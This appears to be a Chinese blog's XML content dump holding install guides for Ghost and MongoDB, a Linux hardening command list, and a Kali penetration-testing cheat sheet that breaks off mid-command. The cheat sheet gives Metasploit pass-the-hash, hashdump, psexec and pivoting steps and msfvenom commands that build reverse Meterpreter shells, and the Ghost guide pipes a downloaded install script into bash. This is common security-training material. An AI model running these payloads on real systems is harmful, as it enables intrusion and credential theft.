使用之处</h1><ol><li>一般出现在博客内容区域，评论，论坛签名等，防止不法粉丝狂刷屏，一是方便用户流畅的查看到价值高的信息，同时也给服务器减压。</li><li>广告区域，也就是广告位，说白了就是赚钱广告费，因为这些广告可能是与本网站无关的信心，如果被爬虫所知道，那么将会影响网站的相关性，所以添加 Nofollow 标识，这样百度搜索引擎就发觉不到了，聪明吧。</li></ol><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> HTML5 </tag>
            
            <tag> SEO </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在你的 VPS 服务器搭建 Ghost 博客系统]]></title>
      <url>/2017/06/insatll-ghost-on-your-vps/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>Ghost 采用 Node.js 编写，默认使用 SQLite3 数据库，非常轻量，因为是文件型数据库，所以无需安装。Ghost 允许多用户编写博文，使用 Markdown 来编写博文<a id="more"></a></p><h1 id="下载-Ghost"><a href="#下载-Ghost" class="headerlink" title="下载 Ghost"></a>下载 Ghost</h1><blockquote><p><a href="//www.ghostchina.com/">Ghost 中文官网</a><br><br><a href="//ghost.org/">Ghost 英文官网</a></p></blockquote><h2 id="Ghost-中文集成版-推介"><a href="#Ghost-中文集成版-推介" class="headerlink" title="Ghost 中文集成版(推介)"></a>Ghost 中文集成版(推介)</h2><blockquote><p><a href="//dl.ghostchina.com/Ghost-0.7.4-zh-full.zip">最新版本：Ghost v0.7.4 full (zh)</a></p></blockquote><p>版本特色：中文汉化、支持七牛、又拍云、阿里云OSS存储；增加 Roon 主题；集成 node_modules ，无需忍受 <code>npm install --production</code> 的麻烦。</p><h2 id="Ghost-中文标准版"><a href="#Ghost-中文标准版" class="headerlink" title="Ghost 中文标准版"></a>Ghost 中文标准版</h2><blockquote><p><a href="//dl.ghostchina.com/Ghost-0.7.4-zh.zip">最新版本：Ghost v0.7.4 (zh)</a></p></blockquote><p>版本特色：中文汉化、支持七牛、又拍云、阿里云OSS存储；增加 Roon 主题</p><h2 id="Ghost-英文原版"><a href="#Ghost-英文原版" class="headerlink" title="Ghost 英文原版"></a>Ghost 英文原版</h2><blockquote><p><a href="//dl.ghostchina.com/Ghost-0.7.4.zip">最新版本：Ghost v0.7.4</a></p></blockquote><h1 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h1><h2 id="VPS-服务器和域名"><a href="#VPS-服务器和域名" class="headerlink" title="VPS 服务器和域名"></a>VPS 服务器和域名</h2><p>VPS 个人服务器当然是必不可少的，解析域名的的时候推介解析为 www</p><h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2><p>Ghost 对 Node.js 版本号要求比较严格，Ghost 官方推荐使用 <code>Node 0.10.x</code> 版本，同时支持 <code>Node 0.12.x</code> 和 <code>Node 4.2.x</code> 版本。</p><p>这边推介使用稳定版 <code>Node 4.2.x</code>。</p><p>安装 Node 推介使用 <code>nvm</code> 安装。</p><pre><code class="bash">wget -qO- //raw.githubusercontent.com/creationix/nvm/v0.32.1/install.sh | bash
nvm install 4
nvm alias defaults 4
</code></pre><h2 id="需要-Nginx-服务"><a href="#需要-Nginx-服务" class="headerlink" title="需要 Nginx 服务"></a>需要 Nginx 服务</h2><p>Ghost 默认监听的端口为 2368，而且只监听本地的 IP 地址进行访问，所以需要 Nginx 这个服务来转发流量</p><p>Ubuntu 下安装直接执行命令</p><pre><code class="bash">apt-get install nginx
</code></pre><h2 id="Ghost-Web-服务器转发原理介绍"><a href="#Ghost-Web-服务器转发原理介绍" class="headerlink" title="Ghost+Web 服务器转发原理介绍"></a>Ghost+Web 服务器转发原理介绍</h2><p>官方文档建议使用 Nginx 作为 Ghost 的前端来转发80端口请求，那么 Ghost 的工作总流程就可以描述为：</p><blockquote><p>Nginx监听80端口，Ghost一直监听本地127.0.0.1:2368端口，你从外网访问www.xxx.com时，Nginx从80端口接收请求，将之转发到本地127.0.0.1:2368端口，然后Ghost就收到访问请求了。</p></blockquote><p>可是为什么不直接让 Ghost 使用 80 端口呢却要依赖 Web 服务器转发呢？这是因为 Ghost 需要运行在 root 权限上，为了避免风险，就用 Nginx 转发一下。另外，Nginx 毕竟是 Web 服务器，配置灵活、并发高，用来做 Ghost 的前端是非常适合的，如果你服务器上还有其他网站那就更要用 Nginx 了，不然你的 80 端口给了 Ghost 就没法负载其他网站了。</p><h2 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h2><pre><code class="bash">unzip -uo [fileName].zip -d [folderName]
</code></pre><h1 id="开始配置使用"><a href="#开始配置使用" class="headerlink" title="开始配置使用"></a>开始配置使用</h1><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>如果你下载的不是 Ghost 中文集成版，那么你就需要在你的项目目录下执行</p><pre><code class="bash">npm install --production
</code></pre><p>当然，这需要翻墙，Ghost 所依赖的默认数据库 sqlite 包需要从国外服务器上（亚马逊的云存储服务）下载原生插件，即使是翻墙了也未必能下载下来，因为 sqlite 的原生插件没有通过 npm 分发。</p><h2 id="配置-config-js"><a href="#配置-config-js" class="headerlink" title="配置 config.js"></a>配置 config.js</h2><p>解压缩之后会有一个 <code>config.example.js</code> 默认配置文件，你需要把它复制重命名成 <code>config.js</code></p><pre><code class="bash">cp config.example.js config.js
</code></pre><h3 id="配置-URL"><a href="#配置-URL" class="headerlink" title="配置 URL"></a>配置 URL</h3><pre><code class="javascript">...
config = {
  production: {
    url: &#39;//www.yourdomian&#39;,
    ...
  }
  ...
}
...
</code></pre><p>注意这边必须写上 <code>//</code> 或者 <code>//</code>，这里写的 URL 就是以后注册账号和登录后台时所用的URL，必须完全一样，如果注册时用的URL和这里的不一样，那么就会出现错误提示说无权限访问！</p><h2 id="配置-Nginx-服务进行转发"><a href="#配置-Nginx-服务进行转发" class="headerlink" title="配置 Nginx 服务进行转发"></a>配置 Nginx 服务进行转发</h2><p>打开 <code>/etc/nginx/nginx.conf</code>，在 http 语句块内追加上：</p><pre><code class="shell">server {
  listen 80;
  server_name www.yourdomian;

  location / {
      proxy_set_header   X-Real-IP $remote_addr;
      proxy_set_header   Host  $http_host;
      proxy_pass //127.0.0.1:2368;
      }
}
</code></pre><h3 id="重启Nginx"><a href="#重启Nginx" class="headerlink" title="重启Nginx"></a>重启Nginx</h3><pre><code class="bash">/etc/init.d/nginx restart
</code></pre><h2 id="配置-Apache-服务进行转发"><a href="#配置-Apache-服务进行转发" class="headerlink" title="配置 Apache 服务进行转发"></a>配置 Apache 服务进行转发</h2><p>打开 <code>/etc/httpd/conf/httpd.conf</code></p><pre><code class="shell"># NameVirtualHost *:80 #这一行取消注释
</code></pre><p>再在文件末尾加上如下语句，配置请求转发</p><pre><code class="shell">&lt;VirtualHost *:80&gt;
    ServerName linuxidc.com
    ProxyRequests Off
    ProxyPreserveHost On
&lt;Proxy *&gt;
    AddDefaultCharset Off
    Order deny,allow
    Allow from all
&lt;/Proxy&gt;
    ProxyPass / //127.0.0.1:2368/
    ProxyPassReverse / //127.0.0.1:2368/
&lt;/VirtualHost&gt;
</code></pre><h3 id="重启-httpd-服务"><a href="#重启-httpd-服务" class="headerlink" title="重启 httpd 服务"></a>重启 httpd 服务</h3><pre><code class="bash">service httpd restart
</code></pre><h1 id="启动-Ghost-服务"><a href="#启动-Ghost-服务" class="headerlink" title="启动 Ghost 服务"></a>启动 Ghost 服务</h1><pre><code class="bash">npm start --production
</code></pre><p>现在启动 Ghost 并访问域名已经能进入博客页面了，但下面还需要实现 Ghost 后台运行，不然你退了终端的话 Ghost 就停止了。</p><h2 id="使用-Forever-让-Ghost-后台运行"><a href="#使用-Forever-让-Ghost-后台运行" class="headerlink" title="使用 Forever 让 Ghost 后台运行"></a>使用 Forever 让 Ghost 后台运行</h2><h3 id="安装-forever-包"><a href="#安装-forever-包" class="headerlink" title="安装 forever 包"></a>安装 forever 包</h3><pre><code class="bash">npm install forever -g
</code></pre><h3 id="启动-Ghost"><a href="#启动-Ghost" class="headerlink" title="启动 Ghost"></a>启动 Ghost</h3><pre><code class="bash">NODE_ENV=production forever start index.js
</code></pre><h3 id="关闭-Ghost"><a href="#关闭-Ghost" class="headerlink" title="关闭 Ghost"></a>关闭 Ghost</h3><pre><code class="bash">forever stop index.js
</code></pre><h3 id="重启动-Ghost"><a href="#重启动-Ghost" class="headerlink" title="重启动 Ghost"></a>重启动 Ghost</h3><pre><code class="bash">NODE_ENV=production forever restart index.js
</code></pre><h3 id="查看运行状态用这条命令"><a href="#查看运行状态用这条命令" class="headerlink" title="查看运行状态用这条命令"></a>查看运行状态用这条命令</h3><pre><code class="bash">forever list
</code></pre><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><blockquote><p>前台：<a href="http://www.yourdomian" target="_blank" rel="external">http://www.yourdomian</a><br><br>后台：<a href="http://www.yourdomian/ghost" target="_blank" rel="external">http://www.yourdomian/ghost</a></p></blockquote><h1 id="拓展配置"><a href="#拓展配置" class="headerlink" title="拓展配置"></a>拓展配置</h1><h2 id="Ghost-邮件系统设置详解"><a href="#Ghost-邮件系统设置详解" class="headerlink" title="Ghost 邮件系统设置详解"></a>Ghost 邮件系统设置详解</h2><blockquote><p><a href="//www.ghostchina.com/mail-configuration-on-self-hosted-version-of-ghost/">Ghost 邮件系统设置详解</a></p></blockquote><h2 id="为博客增加-“标签云”"><a href="#为博客增加-“标签云”" class="headerlink" title="为博客增加 “标签云”"></a>为博客增加 “标签云”</h2><blockquote><p><a href="//www.ghostchina.com/output-tag-cloud/">为博客增加 “标签云”</a></p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Node.js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Windows 下安装 MongoDB]]></title>
      <url>/2017/05/install-mongodb-on-windwos/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>MongoDB 是目前在IT行业非常流行的一种非关系型数据库 (NoSql)，其灵活的数据存储方式备受当前 IT 从业人员的青睐。这里主要讲如何在 Windows 平台下安装 MongoDB<a id="more"></a></p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><blockquote><p><a href="//www.mongodb.com/download-center?jmp=nav#community">MongoDB 官网下载链接</a><br><br>如果被墙的话，请点击 <a href="http://oaq0p7t2g.bkt.clouddn.com/mongodb-win32-x86_64-2008plus-ssl-3.4.1-signed.msi?attname=" target="_blank" rel="external">mongodb-win32-x86_64-2008plus-ssl-3.4.1-signed.msi</a> 下载</p></blockquote><h1 id="手动简单的配置"><a href="#手动简单的配置" class="headerlink" title="手动简单的配置"></a>手动简单的配置</h1><h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>安装成功之后，将 mongodb 目录下的 bin 目录添加至 path 变量中，如：<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/install-mongodb-1.png" alt="Windows 下安装 MongoDB"></p><h2 id="创建数据库文件存放目录"><a href="#创建数据库文件存放目录" class="headerlink" title="创建数据库文件存放目录"></a>创建数据库文件存放目录</h2><p>创建数据库文件的存放位置，比如 <code>D:\mongodb\data\db</code>。启动 mongodb 服务之前需要必须创建数据库文件的存放文件夹，否则命令不会自动创建，而且不能启动成功。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/install-mongodb-2.png" alt="Windows 下安装 MongoDB"></p><p>接下来打开命令行窗口，切换到 <code>D:\MongoDB\bin</code> 目录执行如下命令：</p><pre><code class="bash">mongod --dbpath D:\MongoDB\data\db # 其中 --dbpath 是指定数据库存放目录
</code></pre><p>这是命令行窗口会打印一些启动信息，最后一行显示为如下信息时表示启动成功了</p><pre><code class="bash">2017-05-29T17:23:16.752+0800 I NETWORK  [thread1] waiting for connections on port 27017
</code></pre><h2 id="创建日志文件存放目录"><a href="#创建日志文件存放目录" class="headerlink" title="创建日志文件存放目录"></a>创建日志文件存放目录</h2><p>我们需要指定 log 目录，所以我们创建 log 目录 <code>D:\MongoDB\data\logs\mongodb.log</code>.</p><pre><code class="bash">mongod --dbpath D:\MongoDB\data\db --logpath=D:\MongoDB\data\logs\mongodb.log --logappend
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/install-mongodb-3.png" alt="Windows 下安装 MongoDB"></p><p>这是命令行窗口会打印一些启动信息，最后一行显示为如下信息时表示启动成功了</p><pre><code class="bash">2017-05-29T17:23:16.752+0800 I NETWORK  [thread1] waiting for connections on port 27017
</code></pre><h2 id="安装为-Windows-服务"><a href="#安装为-Windows-服务" class="headerlink" title="安装为 Windows 服务"></a>安装为 Windows 服务</h2><pre><code class="bash">sc create MongoDB binPath= &quot;D:\MongoDB\bin\mongod.exe --service --dbpath D:\MongoDB\data\db --logpath=D:\MongoDB\data\logs\mongodb.log --logappend&quot;
</code></pre><p>启动服务时需要管理员权限</p><pre><code class="bash">net start MongoDB
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/install-mongodb-4.png" alt="Windows 下安装 MongoDB"></p><h1 id="使用配置文件"><a href="#使用配置文件" class="headerlink" title="使用配置文件"></a>使用配置文件</h1><p>很遗憾，官方下载的安装包里面没有默认的配置文件，若想使用配置文件只能自己建一个了，另外个人也推荐使用配置文件来管理 MongoDB 的配置，使用配置文件配置数据库文件、日志文件以及其它的一些配置都一目了然</p><ol><li>解压安装包到 <code>D:\MongoDB</code></li><li>建立数据库目录 <code>D:\MongoDB\data</code></li><li>建立日志目录 <code>D:\MongoDB\logs</code></li><li>建立配置文件目录 <code>D:\MongoDB\etc</code></li><li>建立配置文件 <code>D:\MongoDB\etc\mongodb.conf</code></li></ol><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><pre><code class="shell">dbpath=D:\MongoDB\data # 数据库路径
logpath=D:\MongoDB\logs\mongodb.log # 日志输出文件路径
logappend=true # 错误日志采用追加模式，配置这个选项后 mongodb 的日志会追加到现有的日志文件，而不是从新创建一个新文件
journal=true # 启用日志文件，默认启用
quiet=true # 这个选项可以过滤掉一些无用的日志信息，若需要调试使用请设置为 false
port=27017 # 端口号 默认为 27017
</code></pre><p>这里仅指定了几个常用项，更多详细配置请参考官方文档 <a href="https://docs.mongodb.org/manual/reference/configuration-options/" target="_blank" rel="external">https://docs.mongodb.org/manual/reference/configuration-options/</a></p><h2 id="普通启动"><a href="#普通启动" class="headerlink" title="普通启动"></a>普通启动</h2><pre><code class="bash">mongod --config D:\MongoDB\etc\mongodb.conf
</code></pre><h2 id="安装为-Windows-服务-1"><a href="#安装为-Windows-服务-1" class="headerlink" title="安装为 Windows 服务"></a>安装为 Windows 服务</h2><pre><code class="bash">mongod --config D:\MongoDB\etc\mongodb.conf --install
</code></pre><h2 id="使用SC安装为Windows服务"><a href="#使用SC安装为Windows服务" class="headerlink" title="使用SC安装为Windows服务"></a>使用SC安装为Windows服务</h2><pre><code class="bash">sc create MongoDB binPath= &quot;D:\MongoDB\bin\mongod.exe --service --config=D:\MongoDB\etc\mongodb.conf&quot;
</code></pre><p>启动服务时需要管理员权限</p><pre><code class="bash">net start MongoDB
</code></pre><h2 id="浏览器测试"><a href="#浏览器测试" class="headerlink" title="浏览器测试"></a>浏览器测试</h2><p>打开浏览器，访问 <a href="http://127.0.0.1:27017/" target="_blank" rel="external">http://127.0.0.1:27017/</a> ，显示以下内容表示安装成功<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/install-mongodb-5.png" alt="Windows 下安装 MongoDB"></p><h1 id="附上-Ubuntu-下安装"><a href="#附上-Ubuntu-下安装" class="headerlink" title="附上 Ubuntu 下安装"></a>附上 Ubuntu 下安装</h1><p>Ubuntu 下安装非常简单，执行一条命令就行，无需任何配置，执行完后直接使用。</p><pre><code class="bash">sudo apt-get -y install mongodb
</code></pre><h1 id="图形化管理工具"><a href="#图形化管理工具" class="headerlink" title="图形化管理工具"></a>图形化管理工具</h1><blockquote><p>推介图形化管理工具 <a href="//adminmongo.markmoffat.com/">adminMongo</a></p></blockquote><h2 id="环境需求"><a href="#环境需求" class="headerlink" title="环境需求"></a>环境需求</h2><ul><li>Node.js(使用 nvm 进行安装)</li><li>pm2(<code>npm -g pm2</code>)</li><li>git</li></ul><h2 id="安装并启动"><a href="#安装并启动" class="headerlink" title="安装并启动"></a>安装并启动</h2><h3 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h3><pre><code class="bash">git clone https://github.com/mrvautin/adminMongo.git
cd adminMongo &amp;&amp; npm install
</code></pre><h3 id="pm2-启动"><a href="#pm2-启动" class="headerlink" title="pm2 启动"></a>pm2 启动</h3><pre><code class="bash">cd adminMongo pm2 start app.js
</code></pre><h3 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h3><p>打开浏览器，访问 <a href="http://127.0.0.1:1234/" target="_blank" rel="external">http://127.0.0.1:1234/</a> ，显示以下内容表示安装成功<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/install-mongodb-6.png" alt="Windows 下安装 MongoDB"></p><h3 id="配置使用"><a href="#配置使用" class="headerlink" title="配置使用"></a>配置使用</h3><p>Connection name =&gt; 连接名随意 Connection string =&gt; 连接方法：<code>mongodb://&lt;user&gt;:&lt;password&gt;@127.0.0.1:&lt;port&gt;/&lt;db&gt;</code> Connection options =&gt; 链接选项 <a href="//mongodb.github.io/node-mongodb-native/2.1/reference/connecting/connection-settings/">docs</a></p><p>连接成功后创建一个数据库进行测试<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/install-mongodb-7.png" alt="Windows 下安装 MongoDB"></p><p>随意添加一些数据，注意数据为 JSON 格式<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/install-mongodb-8.png" alt="Windows 下安装 MongoDB"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Windows </tag>
            
            <tag> Node.js </tag>
            
            <tag> MongoDB </tag>
            
            <tag> JSON </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 安全加固命令集合]]></title>
      <url>/2017/05/liunx-security-command/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>收集 Liunx 系统安全加固时，发现系统漏洞，修复系统，加固系统信息等命令集合<a id="more"></a></p><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><pre><code class="bash"># 使用 uid 查找对应的程序
find / -uid 0 -perm -4000

# 查找哪里拥有写权限
find / -perm -o=w

# 查找名称中包含点和空格的文件
find / -name &quot; &quot; -print
find / -name &quot;..&quot; -print
find / -name &quot;. &quot; -print
find / -name &quot; &quot; -print

# 查找不属于任何人的文件
find / -nouser

# 查找那些文件包含指定文本内容
find / -iname &quot;*&quot; | xrags grep &quot;[String]&quot;

# 查找一小时内新增的文件
find / -cmin -60

# 查找所有不可修改的文件
find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’

# 查找 SUID root 文件
find / -user root -perm -4000 -print

# 查找 SGID root 文件:
find / -group root -perm -2000 -print

# 查找 SUID 和 SGID 文件:
find / -perm -4000 -o -perm -2000 -print

# 查找不属于任何用户的文件:
find / -nouser -print

# 查找不属于任何用户组的文件:
find / -nogroup -print

# 查找软连接及其指向:
find / -type l -ls
</code></pre><h1 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h1><pre><code class="bash"># 查找未链接的文件
lsof +L1

# 获取进程打开端口的信息
lsof -i
</code></pre><h1 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h1><pre><code class="bash"># 看看 ARP 表中是否有奇怪的东西
arp -a
</code></pre><h1 id="getent"><a href="#getent" class="headerlink" title="getent"></a>getent</h1><pre><code class="bash"># 查看所有账户
getent passwd

# 查看所有用户组
getent group
</code></pre><h1 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h1><pre><code class="bash"># 使文件不可修改
chattr -i fileKK
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> pentest </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
            <tag> Command </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[kali 下渗透测试的一些小技巧]]></title>
      <url>/2017/05/pentest-tips-and-tricks/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>总结在渗透测试上的一些小技巧，基本上都是 kali 下的一些常用的工具使用集合<a id="more"></a></p><h1 id="DIRB"><a href="#DIRB" class="headerlink" title="DIRB"></a>DIRB</h1><h2 id="使用-DIRB-爆破目录"><a href="#使用-DIRB-爆破目录" class="headerlink" title="使用 DIRB 爆破目录"></a>使用 DIRB 爆破目录</h2><p>注：<a href="//dirb.sourceforge.net/">DIRB</a> 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的 <a href="//github.com/lanjelot/patator">patator</a>，<a href="//github.com/maurosoria/dirsearch">dirsearch</a>，<a href="//www.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a>， 国内的御剑等等。</p><pre><code class="bash">dirb //IP:PORT /usr/share/dirb/wordlists/common.txt
</code></pre><h1 id="Niko"><a href="#Niko" class="headerlink" title="Niko"></a>Niko</h1><h2 id="使用-Nikto-扫描-Web-服务"><a href="#使用-Nikto-扫描-Web-服务" class="headerlink" title="使用 Nikto 扫描 Web 服务"></a>使用 Nikto 扫描 Web 服务</h2><pre><code class="bash">nikto -C all -h //IP
</code></pre><h1 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h1><h2 id="使用-wpscan-扫描-WordPress"><a href="#使用-wpscan-扫描-WordPress" class="headerlink" title="使用 wpscan 扫描 WordPress"></a>使用 wpscan 扫描 WordPress</h2><pre><code class="bash">git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan
./wpscan –url &lt;http://IP/&gt; –enumerate p
</code></pre><h1 id="httprint"><a href="#httprint" class="headerlink" title="httprint"></a>httprint</h1><h2 id="使用-httprint-进行-HTTP-指纹识别"><a href="#使用-httprint-进行-HTTP-指纹识别" class="headerlink" title="使用 httprint 进行 HTTP 指纹识别"></a>使用 httprint 进行 HTTP 指纹识别</h2><pre><code class="bash">wget //www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip
cd httprint_301/linux/
./httprint -h //IP -s signatures.txt
</code></pre><h1 id="Skipfish"><a href="#Skipfish" class="headerlink" title="Skipfish"></a>Skipfish</h1><h2 id="使用-Skipfish-进行-Web-应用安全"><a href="#使用-Skipfish-进行-Web-应用安全" class="headerlink" title="使用 Skipfish 进行 Web 应用安全"></a>使用 Skipfish 进行 Web 应用安全</h2><p>注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。</p><pre><code class="bash">skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u //IP
</code></pre><h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><h2 id="使用-nc-进行扫描"><a href="#使用-nc-进行扫描" class="headerlink" title="使用 nc 进行扫描"></a>使用 nc 进行扫描</h2><pre><code class="bash">nc -v -w 1 target -z 1-1000
for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
</code></pre><h1 id="us"><a href="#us" class="headerlink" title="us"></a>us</h1><h2 id="使用-Unicornscan-进行信息收集和安全审计"><a href="#使用-Unicornscan-进行信息收集和安全审计" class="headerlink" title="使用 Unicornscan 进行信息收集和安全审计"></a>使用 Unicornscan 进行信息收集和安全审计</h2><pre><code class="bash">us -H -msf -Iv 192.168.56.101 -p 1-65535
us -H -mU -Iv 192.168.56.101 -p 1-65535

# -H 在生成报告阶段解析主机名
# -m 扫描类型 (sf - tcp, U - udp)
# -Iv - 详细
</code></pre><h1 id="Xprobe2"><a href="#Xprobe2" class="headerlink" title="Xprobe2"></a>Xprobe2</h1><h2 id="使用-Xprobe2-识别操作系统指纹"><a href="#使用-Xprobe2-识别操作系统指纹" class="headerlink" title="使用 Xprobe2 识别操作系统指纹"></a>使用 Xprobe2 识别操作系统指纹</h2><pre><code class="bash">xprobe2 -v -p tcp:80:open IP
</code></pre><h1 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h1><h2 id="使用-Meterpreter-进行端口转发"><a href="#使用-Meterpreter-进行端口转发" class="headerlink" title="使用 Meterpreter 进行端口转发"></a>使用 Meterpreter 进行端口转发</h2><pre><code class="bash"># //www.offensive-security.com/metasploit-unleashed/portfwd/
# 转发远程端口到目标地址

meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali &gt; rdesktop 127.0.0.1:3389
</code></pre><h2 id="使用-Meterpreter-获取哈希值"><a href="#使用-Meterpreter-获取哈希值" class="headerlink" title="使用 Meterpreter 获取哈希值"></a>使用 Meterpreter 获取哈希值</h2><pre><code class="bash">git clone https://github.com/byt3bl33d3r/pth-toolkit
pth-winexe -U hash //IP cmd

# 或者

apt-get install freerdp-x11
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

# 在或者

meterpreter &gt; run post/windows/gather/hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
msf &gt; use exploit/windows/smb/psexec
msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) &gt; exploit
meterpreter &gt; shell
</code></pre><h3 id="使用-Hashcat-破解密码"><a href="#使用-Hashcat-破解密码" class="headerlink" title="使用 Hashcat 破解密码"></a>使用 Hashcat 破解密码</h3><pre><code class="bash">hashcat -m 400 -a 0 hash /root/rockyou.txt
</code></pre><h2 id="使用-metasploit-进行穿透"><a href="#使用-metasploit-进行穿透" class="headerlink" title="使用 metasploit 进行穿透"></a>使用 metasploit 进行穿透</h2><pre><code class="bash">route add X.X.X.X 255.255.255.0 1
use auxiliary/server/socks4a
run
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E

#或者

# //www.offensive-security.com/metasploit-unleashed/pivoting/
meterpreter &gt; ipconfig
IP Address  : 10.1.13.3
meterpreter &gt; run autoroute -s 10.1.13.0/24
meterpreter &gt; run autoroute -p
10.1.13.0          255.255.255.0      Session 1
meterpreter &gt; Ctrl+Z
msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec
msf exploit(psexec) &gt; set RHOST 10.1.13.2
msf exploit(psexec) &gt; exploit
meterpreter &gt; ipconfig
IP Address  : 10.1.13.2
</code></pre><h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><h2 id="SSH-穿透"><a href="#SSH-穿透" class="headerlink" title="SSH 穿透"></a>SSH 穿透</h2><pre><code class="bash">ssh -D 127.0.0.1:1080 -p 22 user@IP
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains commands target
</code></pre><h2 id="SSH-穿透从一个网络到另一个网络"><a href="#SSH-穿透从一个网络到另一个网络" class="headerlink" title="SSH 穿透从一个网络到另一个网络"></a>SSH 穿透从一个网络到另一个网络</h2><pre><code class="bash">ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target
</code></pre><h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><h2 id="MSF-Payloads"><a href="#MSF-Payloads" class="headerlink" title="MSF Payloads"></a>MSF Payloads</h2><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe
msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c
</code></pre><h2 id="MSF-生成在-Linux-下反弹的-Meterpreter-Shell"><a href="#MSF-生成在-Linux-下反弹的-Meterpreter-Shell" class="headerlink" title="MSF 生成在 Linux 下反弹的 Meterpreter Shell"></a>MSF 生成在 Linux 下反弹的 Meterpreter Shell</h2><pre><code class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell
</code></pre><h2 id="MSF-生成反弹-Shell-C-Shellcode"><a href="#MSF-生成反弹-Shell-C-Shellcode" class="headerlink" title="MSF 生成反弹 Shell (C Shellcode)"></a>MSF 生成反弹 Shell (C Shellcode)</h2><pre><code class="bash">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c
